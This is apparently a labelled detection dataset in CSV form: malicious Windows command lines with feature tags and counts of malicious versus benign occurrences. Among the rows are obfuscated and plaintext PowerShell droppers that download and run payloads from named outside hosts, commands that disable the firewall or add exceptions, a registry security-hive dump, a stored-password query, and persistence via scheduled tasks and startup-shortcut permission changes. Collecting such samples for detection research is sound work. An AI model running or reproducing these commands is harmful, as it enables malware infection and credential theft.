tags,mal_cnt,ben_cnt,example
arg_-e; arg_-windowstyle; arg_hidden; arg_powershell; normal_entropy; parentprocess_unknown_process.exe; very_high_string_len,112,0,PowersHeLL -WinDowsTyle hidden -e IAAuACgAKABnAGUAVAAtAFYAQQByAEkAQQBCAEwARQAgACcAKgBNAEQAcgAqACcAKQAuAE4AYQBNAGUAWwAzACwAMQAxACwAMgBdAC0ASgBvAGkATgAnACcAKQAgACgAIAAoACgAIgB7ADYAOQB9AHsANgAyAH0AewAxADYAfQB7ADQANwB9AHsAMwA5AH0AewAxADAAfQB7ADMAMQB9AHsAOAAwAH0AewAzADAAfQB7ADUAOQB9AHsAOQAwAH0AewA0ADYAfQB7ADcAMAB9AHsAMgA3AH0AewAxADMAfQB7ADcANQB9AHsANAA1AH0AewA2ADQAfQB7ADkAfQB7ADMANwB9AHsANgA4AH0AewAxADgAfQB7ADUANgB9AHsANQA4AH0AewA4ADkAfQB7ADUAMgB9AHsAMQA3AH0AewAxADIAfQB7ADEANQB9AHsANwA3AH0AewA0ADEAfQB7ADMANgB9AHsAMQAxAH0AewAxADQAfQB7ADIAMQB9AHsAOQA0AH0AewA1ADEAfQB7ADgAMwB9AHsAMgAyAH0AewA2ADYAfQB7ADMAMgB9AHsAMQB9AHsAMQA5AH0AewAwAH0AewA3ADgAfQB7ADkAMwB9AHsANwA5AH0AewAyADMAfQB7ADcAMgB9AHsANQA0AH0AewAzADUAfQB7ADYANQB9AHsANwAzAH0AewAyADUAfQB7ADgANgB9AHsANgAzAH0AewA1ADUAfQB7ADQAMgB9AHsANAAwAH0AewA5ADUAfQB7ADQANAB9AHsANQA3AH0AewA0AH0AewA3AH0AewAyADkAfQB7ADkAMQB9AHsANwAxAH0AewA0ADMAfQB7ADIANAB9AHsANwA0AH0AewA4ADIAfQB7ADgANQB9AHsANgAwAH0AewA2ADcAfQB7ADcANgB9AHsAMwA4AH0AewA1AH0AewAzADQAfQB7ADkAMgB9AHsAMgA2AH0AewA2AH0AewA4AH0AewA2ADEAfQB7ADUAMwB9AHsAMgB9AHsANQAwAH0AewAyADgAfQB7ADgANAB9AHsAOAAxAH0AewAzADMAfQB7ADgAOAB9AHsAOAA3AH0AewA0ADgAfQB7ADQAOQB9AHsAMwB9AHsAMgAwAH0AIgAgAC0AZgAnAHcALgBjAG8AbQAvAEsATwAnACwAJwBxACcALAAnADgAZwByAFMARAAnACwAJwBiACcALAAnAHIAJwAsACcAYwAnACwAJwB0AHIAJwAsACcAZQBhAGMAJwAsACcAUQBzAFAAaQBRAHMAUABOACcALAAnAEYANwB3AEIARgAnACwAJwBCAEYAJwAsACcAbgBlACcALAAnAGwAaQBlAG4AdAA7ADgAZwByACcALAAnAHIAYQBuAGQAbwAnACwAJwB4AHQAJwAsACcATgAnACwAJwBzAGQAIAAnACwAJwBDACcALAAnAGIAagBlAGMAdABCAEYAJwAsACcAMQB3ADgAZABxACcALAAnAHIAZQBhAGsAOwB9AGMAYQB0AGMAaAB7AH0AfQAnACwAJwAoACcALAAnADcADQAKAGgAdAB0AHAAJwAsACcAaABwAD8AbAA9ACcALAAnAEQAQwAnACwAJwBnACcALAAnAFQAbwBTACcALAAnAHQAQgBGADcAKQAgACcALAAnADsAJgAoAEIARgA3AEkAbgB2AG8AQgBGADcAKwBCAEYAJwAsACcAaAAoACcALAAnADcAdwAtAG8AYgAnACwAJwA3AGUAQgBGACcALAAnADQAJwAsACcAZQAtAEkAdAAnACwAJwAuAE0AdwAnACwAJwAoAEIAJwAsACcAbgBzAGEAZABhAHMAZAAuACcALAAnADcAKwBCAEYAJwAsACcAcwBmACcALAAnAG4AQgBGADcAKwAnACwAJwA3AEcAWQB4AEIARgA3ACAAKwAgADgAZwByAE4AUwBCACAAKwAgACcALAAnADgAZwByACcALAAnACsAIABCAEYAJwAsACcAIAA4AGcAcgBBACcALAAnAC4AZQB4AEIARgA3ACsAQgBGADcAZQBCAEYAJwAsACcAVQAgAD0AIAAuACgAQgBGADcAbgBlAEIARgA3ACcALAAnADcAKwAnACwAJwA9ACAAJgAoAEIARgA3ACcALAAnAEMAJwAsACcAKQA7ACcALAAnAEMAKQAnACwAJwAgAEIAJwAsACcATgBlAHQALgBXAGUAYgAnACwAJwAgACcALAAnAEYANwAuAFMAcABsAGkAdAAnACwAJwBsAGkAYwAgACcALAAnADcAJwAsACcANwApADsAZgBvACcALAAnACkAIAAnACwAJwBqACcALAAnAHIAeQB7ADgAZwByAFkAWQBVAC4ATQB3ADAARABvAFEAcwBQAFcAbgBsACcALAAnAGcATQB3ADAAKAApACwAJwAsACcAcwBhAGQAYQAnACwAJwA4AGcAcgBlAG4AdgA6AHAAdQBiACcALAAnACsAQgAnACwAJwBGACcALAAnADoALwAvAGcAOQAnACwAJwBRAHMAUABPAGEAZABGAEkAUQBzAFAAbABlAE0AJwAsACcANwAtAG8AJwAsACcAOABnAHIAbgAnACwAJwBCAEYANwAnACwAJwBnAHIAYQBzAGYAYwAgAGkAbgAnACwAJwBhAG4AbwBwAGsAYQA2AC4AeQBhAHIAbgBCACcALAAnADcAQABCAEYANwApADsAOAAnACwAJwBYACcALAAnAG0AOwA4AGcAcgBZAFkAJwAsACcAdwAwACgAOABnAHIAYQAnACwAJwBTAEIAIAA9ACAAJwAsACcAUgAvAHQAZQAnACwAJwB2AC4AcAAnACwAJwA3ACsAQgBGACcALAAnADcAJwAsACcAKQAnACwAJwBGACcALAAnADcAawBCAEYANwArAEIARgAnACwAJwB7AHQAJwAsACcAcgBTAEQAQwAgAD0AIAAnACwAJwBnAHIAUwBEACcALAAnAGUAbQBCAEYANwApACgAOAAnACwAJwBTAHkAcwB0AGUAbQAuACcALAAnAGUAYwBCAEYAJwAsACcAOAAnACwAJwAwACcALAAnAHMAdAAnACwAJwAxADAAMAAwADAALAAgADIAOAAyADEAMwAzACkAOwA4AGcAcgBBAEQAQwBYACAAPQAnACwAJwAoAEIARgA3ACcAKQApAC4AUgBlAFAAbABBAEMAZQAoACcAUQBzAFAAJwAsAFsAcwB0AHIAaQBuAGcAXQBbAGMAaABBAFIAXQA5ADYAKQAuAFIAZQBQAGwAQQBDAGUAKAAnAE0AdwAwACcALABbAHMAdAByAGkAbgBnAF0AWwBjAGgAQQBSAF0AMwA0ACkALgBSAGUAUABsAEEAQwBlACgAKABbAGMAaABBAFIAXQA1ADYAKwBbAGMAaABBAFIAXQAxADAAMwArAFsAYwBoAEEAUgBdADEAMQA0ACkALAAnACQAJwApAC4AUgBlAFAAbABBAEMAZQAoACcAQgBGADcAJwAsAFsAcwB0AHIAaQBuAGcAXQBbAGMAaABBAFIAXQAzADkAKQAuAFIAZQBQAGwAQQBDAGUAKAAnAEcAWQB4ACcALABbAHMAdAByAGkAbgBnAF0AWwBjAGgAQQBSAF0AOQAyACkAIAApACAA
arg_cmd; dir_%temp%; ext_bat; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,111,2,"cmd /c """"%TEMP%\install.bat"" """
dir_%temp%; high_entropy; normal_string_len; parentprocess_unknown_process.exe,110,14,"/noconfig /fullpaths @""%TEMP%\v4shyjdy.cmdline"""
dir_%temp%; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,107,2,"/noconfig /fullpaths @""%TEMP%\oq4oi3xc.cmdline"""
arg_net; arg_stop; low_entropy; low_string_len; parentprocess_cmd.exe,101,1,net  stop MpsSvc
ext_doc; low_string_len; not_in_range,100,9,"/n ""C:\Deposit.doc"""
low_entropy; normal_string_len,99,139,"""C:\core.dll"",Discord_Respond"
ext_exe; low_entropy; low_string_len; parentprocess_unknown_process.exe,99,1,/f /im svcfdom1.exe
arg_get; arg_path; arg_wmic; high_string_len; normal_entropy; parentprocess_unknown_process.exe,98,1,WMIC /Node:localhost /Namespace:\\root\cimv2 Path Win32_PnpSignedDriver Get /Format:List
arg_-embedding; arg_c; normal_entropy; normal_string_len,98,1,-Embedding D0F1FB3BFC0385B7B10FA7C6E9A8F86E C
arg_cacls; dir_%appdata%; dir_%systemroot%; dir_%windir%; ext_lnk; high_string_len; normal_entropy; parentprocess_cmd.exe,98,333,"cacls  ""%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Start.lnk"" /T /E /G Users:F /C"
arg_cacls; dir_%appdata%; dir_%systemroot%; dir_%windir%; ext_lnk; high_string_len; normal_entropy; parentprocess_wscript.exe,97,333,"/c cacls ""%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Start.lnk"" /T /E /G Users:F /C"
arg_3; arg_timeout; parentprocess_cmd.exe; very_low_entropy; very_low_string_len,95,1,timeout  3
high_string_len; low_entropy; parentprocess_unknown_process.exe,94,23,"""-1488947217-1940510999479407693-1605953822-17617676411856860559-1871575828-52276529"
arg_add; arg_allowedprogram; arg_enable; arg_firewall; arg_netsh; ext_exe; high_string_len; normal_entropy; parentprocess_unknown_process.exe,92,1,"netsh firewall add allowedprogram ""C:\a9ce945b4e4bbc2e562eb941516cc6ac.exe"" ""a9ce945b4e4bbc2e562eb941516cc6ac.exe"" ENABLE"
arg_taskkill; ext_exe; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,91,1,/c taskkill /f /im CaptureLibService.exe
ext_doc; normal_entropy; not_in_range,91,15,"/n ""C:\PAYMENT81L.doc"""
arg_1; arg_timeout; low_entropy; not_in_range; parentprocess_cmd.exe,90,15,Timeout  /t 1 /NOBREAK
dir_%temp%; ext_tmp; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,87,2,"/create /f /tn ""PCI Monitor"" /xml ""%TEMP%\tmpED44.tmp"""
arg_timeout; low_entropy; low_string_len; parentprocess_cmd.exe,87,2,timeout  /t 200
ext_vbs; low_entropy; low_string_len,85,2,"""C:\Nuovodoc3.vbs"""
ext_vbs; normal_entropy; normal_string_len,85,1,"""C:\DocOrdn93473010b.vbs"""
low_entropy; low_string_len; parentprocess_cmd.exe,85,2,"/S /D /c"" ftype"""
arg_add; arg_allowedprogram; arg_enable; arg_firewall; arg_netsh; ext_exe; high_entropy; high_string_len; parentprocess_unknown_process.exe,82,3,"netsh firewall add allowedprogram ""C:\f346938a83b4bb5b50c8a6b38917b0a9.exe"" ""f346938a83b4bb5b50c8a6b38917b0a9.exe"" ENABLE"
dir_%temp%; ext_bat; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,76,2,"/c """"%TEMP%\install.bat"" """
arg_-s; arg_-x; arg_1388; parentprocess_unknown_process.exe; very_low_entropy; very_low_string_len,75,1,-x -s 1388
arg_start; dir_%userprofile%; normal_entropy; normal_string_len; parentprocess_powershell.exe,75,1,/c start %USERPROFILE%\Music\dut.pkzip
ext_exe; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,75,2,"/f /im ""WinkHandler.exe"""
arg_cmd; parentprocess_unknown_process.exe; very_high_entropy; very_high_string_len,73,25,"Cmd pFwzqQc QYpPwLciTTFmQYFbGOBJJYf FKOTKWNOw  &  %co^m^S^p^E^c%  /c ^C^M%WiNDIR:~  6,  -3%,  ,  , , /^v^ ^ ^  , /%USerpROfIlE:~+6, 1%  "" ,  ,( ,(  , , ,(^sE^T ^dn9^b=^sn t^B^ t3^ jg^ GB^ ^YE hw^ 19 mn ^Cm ^0^7^ y^z^ Fw z^K g^T ^a^W^ B1^ ^hi}Y4}^1 {R^BhK8c^Ux^t^i7^aX^2cIP^}^t^g;D^hkBaaG1em^qr^L4b^H^Z;O1^Bab^P^L^7mi^G^$A^b ^bosEAs^UIem^DcfQ^o^ ^6rnEP^QW-m7tdgrx^i^av^l^taTSn7^;n^k^)X^SB^XZ^P^5Gm^ch$^K^c O^4^,1j^WWkpi9^p^wf$eO^(V^Yek^4^l^UsiIF^F^lNdLYanq^o0Kl1^LnlowN^ToD7^D^kN.^ c^j^6Ewxlb^V^B$v^b^{V8^yObrkNt^M^Q^{WI^)L^dt6^k^PiFj^dE$Kt aqnNI^iC5^ ^h0^Wxbp^rE^pM^w$^r3^(Yo^hwnc^H^XaxR^enI^r^Ckoz^qfn^C^;^zG'^Cr^eyQx^7zek9.7R^'^z0^+^uU^VlIav^U^l^D^t^$O1+wr'j4^\rn^'^L1^+^wT^p74mg^0ewY^tKJ:mFv3^Lnj7^eK1$H6=^h^SBhKPiRmO^U^$G6;^EG'784^RJ0i^r9^hp'VW^ UR=Zs ^I^fVh^Ya^kyl^V^h^$k4;^f^r^)PT'MH@^ig^'6^q^(F^qtcti^v^hlr4pLtS^d^L.b^8'qz^O^rH^sGj^c^P^8^C9^JK5^H/^YQ^r4i^b^Mv.u ^m1N^o^LW^cEm^.^9^A^m^mhi2Stt^ka^xw^tU^7/cl^/JB:^JN^p^LQtn9t^qyhN^a@NG^dZ1^q^5M^6^F^wsxa^cQDVAv^p^p^S/bOm^Q^ToLdc ^q.9os^sPt62e^9a^rgV^c^b^U^e^I8sH^b-Q^4^eo^j^g^afaGDt^YLsrvk^BIc^uoa^h8b1L^/R1^/^K^w^:f^LpRjtjZt^w^YhT^P^@0^joiA^F^m^ygtH2^j^dtwf/^m^rm3B^o4ScIu^.k^l^op5rq6^tz^6k3^re2L^l^E^DezJv^F^2ocyzu^aa^w^P^/a^L^/F^M:D^Zpnc^tHktBlhE9^@Lf^E^Ld^j^i^BElj/VGox^G^f^Xnn^hTiO3.G^YnI6omtlP^Rao^c^sWt-kB^aD0^u^rQlzfp^Qc^m^bhaR^X/^xW^/^Kj:N^epFJ^t^Antlq^hkr@OaSmC^Wv^P^f^A^5nGOKX3/0^5^kQU^uA^9.^9Wo^6^p^cn^z.^blsKe^dZxr^gA^o^5^Ww^k^1eRu^hlatFt^d4^lnf^x^o^hQ^yuDe^Pp^bE^b/^m^w/CB:^BgpVatk^Yt^yV^h0N^'LQ^=^h^A^tz^kPh^7jVa$v^K;LSt^yon^BSeA8iHl^l^5^uC^7^WbU^sedNWST.^0^V^t^49^e^ xN^od 0Bt^MCc^q^Ge^s^Hj^sRb^g^P^oh^p^-^S0^w^T^0e^avns^9=T8jj^b^wo^I^bSw^$N^7^ V6l^xE^le^xeeOhB^7^sR^L^rM^K^elf^w^P^Jo0N^p),   , ,,   , )  ,  ,  ,,, )&   , ^Fo^R ,,  , /^l , , ,%x,,  ^IN ,, ,(^+10^94   , ^ -3  ^ ^,^+^2,^ ^ , ) , ^DO  ,  , (   , ,   ,   ( ,, , ^SeT    ^R^OSe=!^R^OSe!!^dn9^b:~ %x,   1!) ,, , ,  ,  )&&  ,  ,,^If,%x,   ,, , l^Eq,,  ,  ^2  , ,  ( , (^caL^L, ,%^R^OSe:~^+^6%   )   ,   )  """
arg_find; ext_exe; normal_entropy; not_in_range; parentprocess_cmd.exe,73,14,"find  /i ""taskmgr.exe"""
dir_%temp%; ext_tmp; high_string_len; normal_entropy; parentprocess_unknown_process.exe,72,1,"/create /f /tn ""PCI Monitor Task"" /xml ""%TEMP%\tmpEF97.tmp"""
arg_-embedding; very_low_entropy; very_low_string_len,71,1,-Embedding
dir_%temp%; ext_tmp; high_entropy; high_string_len; parentprocess_csc.exe,70,158,"/NOLOGO /READONLY /MACHINE:IX86 ""/OUT:%TEMP%\RES63BE.tmp"" ""%TEMP%\CSC63A9.tmp"""
dir_%temp%; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,69,2,"/c ""reg.exe save hklm\security %TEMP%\iuxvoleff"""
arg_start; ext_com; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,68,1,/c START www.pornhub.com
arg_cmd; parentprocess_unknown_process.exe; very_low_entropy; very_low_string_len,67,1,"""cmd"""
arg_-ec; arg_-noexit; normal_entropy; parentprocess_unknown_process.exe; very_high_string_len,66,0,/c p^O^W^e^r^S^h^E^l^l.e^X^e -NoExit -EC JABrAG8AZABpAGYAYQBTAHUAUgBpAEYAVQBTAE8ASABVAGYAaQAgAD0AIABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAIgBhAEEAQgAwAEEASABRAEEAYwBBAEEANgBBAEMAOABBAEwAdwBCAGgAQQBIAE0AQQBkAFEAQgBrAEEASABFAEEAYQBRAEIAMQBBAEgAYwBBAFoAQQBCADMAQQBHAFEAQQBjAFEAQgAzAEEAQwA0AEEAWQB3AEIAdgBBAEcAMABBAEwAdwBCAHcAQQBHAEUAQQBjAEEAQgBwAEEARwA0AEEAYQBRAEIAaABBAEgATQBBAFoAUQBCADIAQQBIAE0AQQBiAHcAQQB2AEEASABnAEEAZQBBAEIANABBAEcAVQBBAEwAZwBCAHcAQQBHAHMAQQBhAFEAQQAvAEEASABvAEEAUABRAEIAdABBAEMAWQBBAFkAZwBCAGwAQQBHAEkAQQBQAFEAQgAzAEEASABVAEEAZQBBAEIAbABBAEgARQBBAGIAdwBCAHkAQQBHADgAQQBKAGcAQgA0AEEASABrAEEAYQB3AEIAMQBBAEQAMABBAFoAQQBCADEAQQBIAG8AQQBZAFEAQgBpAEEARwBFAEEAWgBBAEIAaABBAEMAWQBBAGQAQQBCADUAQQBIAE0AQQBkAFEAQgB0AEEARwBVAEEAUABRAEIANABBAEgAVQBBAGIAUQBCAGgAQQBBAD0APQAiACkAKQA7ACQAQgBvAEgAbwBEAHkASgBlAGIAQQAgAD0AIAAiAFQAYQBSAEUAcwBlAHEATwBUAGkAbQBpAEQASQBoAFUAWgBlAHEAIgAsACIATQBpAEYAdQBhAEUAVABVAHAAVQBxAEEAeABFAHcAWQBHAE8AIgAsACIAZAB5AHgAYQB6AFkAeABpAFYAaQBkAGUAZwBJAEMAeQB0AG8AZABZAGIARQAiACwAIgBkAHUAagBhAHEAbwBhAFkARAB5AFcAdQAiADsAJABwAEUAdABlAE0AbwB3AE8AUwBPAEIASQBsAEEAWAAgAD0AIAAxADUANgA2ADIAOwAkAEwAaQBNAGkAUwBPAHYAaQBmAGUAaQBhAEYAaQB4AFUAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAKAAiAHAAVQBHAFUAawB1AEgARQBSAEEAYwAiACwAIgBwAFUARwBVAGsAdQBIAEUAUgBBAGMAIgApAC4AUwBlAGMAdQByAGUAUABhAHMAcwB3AG8AcgBkADsAJAB3AGkAYgBlAFMAQQBLAHUAQgB1AEsAWQBYAE8ARwBlAFIAZQAgAD0AIAAiACIAOwAkAGIAZQBsAGkAYQB5AHEAaQBEAHkAYgBVACAAPQAgACIAMgA0ACAANwA3ACAAMgAwACAAMwBEACAAMgAwACAANABFACAANgA1ACAANwA3ACAAMgBEACAANABGACAANgAyACAANgBBACAANgA1ACAANgAzACAANwA0ACAAMgAwACAANQAzACAANwA5ACAANwAzACAANwA0ACAANgA1ACAANgBEACAAMgBFACAANABFACAANgA1ACAANwA0ACAAMgBFACAANQA3ACAANgA1ACAANgAyACAANAAzACAANgBDACAANgA5ACAANgA1ACAANgBFACAANwA0ACAAMwBCACAAMgAwACAAMgA0ACAANwAwACAAMgAwACAAMwBEACAAMgAwACAANABFACAANgA1ACAANwA3ACAAMgBEACAANABGACAANgAyACAANgBBACAANgA1ACAANgAzACAANwA0ACAAMgAwACAANQAzACAANwA5ACAANwAzACAANwA0ACAANgA1ACAANgBEACAAMgBFACAANAA0ACAANgA5ACAANgAxACAANgA3ACAANgBFACAANgBGACAANwAzACAANwA0ACAANgA5ACAANgAzACAANwAzACAAMgBFACAANQAwACAANwAyACAANgBGACAANgAzACAANgA1ACAANwAzACAANwAzACAAMwBCACIAOwBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgB0AEUAUwB5AE4AdQBrAFUAcQBhACIAOwAkAHYAYQBDAG8AZABhAHQAYQBkAFUAYQBvAEwAVQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBVAHIAaQAoACIAaAB0AHQAcABzADoALwAvAE0AbwBTAEUAYQBhAEMAWQBiAFkAcgBFAC4ATQBvAFMARQBhAGEAQwBZAGIAWQByAEUAIgApADsAVwByAGkAdABlAC0ASABvAHMAdAAgACIAUABlAEwATwBKAE8AegBpAEsAeQBtAEUAcQBlACIAOwAkAGIAZQBsAGkAYQB5AHEAaQBEAHkAYgBVAC4AUwBwAGwAaQB0ACgAIgAgACIAKQAgAHwAIABmAG8AcgBFAGEAYwBoACAAewBbAGMAaABhAHIAXQAoAFsAYwBvAG4AdgBlAHIAdABdADoAOgB0AG8AaQBuAHQAMQA2ACgAJABfACwAMQA2ACkAKQB9ACAAfAAgAGYAbwByAEUAYQBjAGgAIAB7ACQAdwBpAGIAZQBTAEEASwB1AEIAdQBLAFkAWABPAEcAZQBSAGUAIAA9ACAAJAB3AGkAYgBlAFMAQQBLAHUAQgB1AEsAWQBYAE8ARwBlAFIAZQAgACsAIAAkAF8AfQA7ACQAWgBPAHQAaQBHAGkASwBBAGEASQBpAEkAbABlAGcAYQAgAD0AIAA3ADYAOQAwADcAOwBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBuAEEAdABhAHMAQQB2AG8AZAB1AHQARQBuAEUAYgBpAGEAdQBGAEkAUwAiADsAaQBlAHgAKAAkAHcAaQBiAGUAUwBBAEsAdQBCAHUASwBZAFgATwBHAGUAUgBlACkAOwAkAHMAYQBsAFUAeABBAG4ARQBrAGkAeABhAE0AZQBIAG8AdgBvAGMAeQBkACAAPQAgAFsAZQBuAHYAaQByAG8AbgBtAGUAbgB0AF0AOgA6AGcAZQB0AGYAbwBsAGQAZQByAHAAYQB0AGgAKAAiAE0AeQBNAHUAcwBpAGMAIgApACsAIgBcAGwAeQBnAHkALgBwAGsAegBpAHAAIgA7AFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAGoARQBoAGEAZwBhAGEAQQBGAEEAcABpAGsAQQAiADsAJAByAFkASABhAG4AQQBSAFkAawBlAHEAaQBiAEUAbQB1AGcAVQBEAGUAcgAgAD0AIAA0ADkAOQAwADgAOwAkAHMAYQBRAG8AdABPAHIASQBXAEUAbQBVAHAAeQB2AG8AIAA9ACAAIgBuAGUAQgBFAEgAdQBOAG8AaQBhAE0AYQBXAGEAUABFAGEAZQAiACwAIgBhAEEAYwB5AEMATwB0AGEATAB1AGkASQBzAGkAbABhAHEAZQBWAGEAIgAsACIAawBpAEsAeQByAEUAaABpAFQAQQBjAFUAQgAiACwAIgBWAHUAVABlAFEAdQBtAEEASABPAFEAVQBxAGEAYgBZAEsASQAiACwAIgBKAE8ASABVAEYAeQBnAHUAegBVAE4AeQBkAFUAVgBhAFYAdQBqACIAOwAkAHcALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACQAawBvAGQAaQBmAGEAUwB1AFIAaQBGAFUAUwBPAEgAVQBmAGkALAAkAHMAYQBsAFUAeABBAG4ARQBrAGkAeABhAE0AZQBIAG8AdgBvAGMAeQBkACkAOwAkAHAALgBTAHQAYQByAHQASQBuAGYAbwAuAEYAaQBsAGUATgBhAG0AZQAgAD0AIAAiAGMAbQBkAC4AZQB4AGUAIgA7ACQAUAB1AGsAQQBXAE8AcgBFAGgAbwBRACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFUAcgBpACgAIgBoAHQAdABwAHMAOgAvAC8ASABvAFMAYQBDAHUAUABlAFEAZQB4AHkAdgBBAEwALgBIAG8AUwBhAEMAdQBQAGUAUQBlAHgAeQB2AEEATAAiACkAOwAkAHAALgBTAHQAYQByAHQASQBuAGYAbwAuAEEAcgBnAHUAbQBlAG4AdABzACAAPQAgACIALwBjACAAcwB0AGEAcgB0ACAAJABzAGEAbABVAHgAQQBuAEUAawBpAHgAYQBNAGUASABvAHYAbwBjAHkAZAAiADsAJABwAC4AUwB0AGEAcgB0AEkAbgBmAG8ALgBDAHIAZQBhAHQAZQBOAG8AVwBpAG4AZABvAHcAIAA9ACAAJAB0AHIAdQBlADsAJABwAC4AUwB0AGEAcgB0AEkAbgBmAG8ALgBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAVwBpAG4AZABvAHcAUwB0AHkAbABlAF0AOgA6AEgAaQBkAGQAZQBuADsAJABwAC4AUwB0AGEAcgB0ACgAKQA7AEUAeABpAHQAOwA=
arg_powershell; dir_%temp%; parentprocess_cmd.exe; very_high_entropy; very_high_string_len,65,25,"powershell  ""function hlctt([string] $flswt){(new-object system.net.webclient).downloadfile($flswt,'%TEMP%\ugkj.exe');start-process '%TEMP%\ugkj.exe';}try{hlctt('http://nrrgarment.com/lopsertors.bin')}catch{hlctt('http://oasis-projects.com/lopsertors.bin')}"
arg_query; arg_reg; normal_entropy; normal_string_len; parentprocess_cmd.exe,63,1,"reg  query ""HKEY_CURRENT_USER\Software\IMVU\password"""
arg_cacls; dir_%appdata%; high_string_len; normal_entropy; parentprocess_wscript.exe,63,333,"/c cacls ""%APPDATA%\nvixpuwbm\ueodwieef"" /T /E /G Users:F /C"
dir_%temp%; ext_reg; normal_entropy; normal_string_len; parentprocess_cmd.exe,63,1,/s %TEMP%\UpsxJGIWpc508535809380720030.reg
arg_cmd; dir_%temp%; ext_exe; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,63,2,"cmd /c """"%TEMP%\3769533.bat""       ""C:\cvc.exe""   """
arg_bitsadmin; normal_entropy; normal_string_len; parentprocess_cmd.exe,61,1,bitsadmin  /resume CjvO
arg_find; ext_exe; low_entropy; normal_string_len; parentprocess_cmd.exe,61,1,"find  /I /N ""vPpuo.exe"""
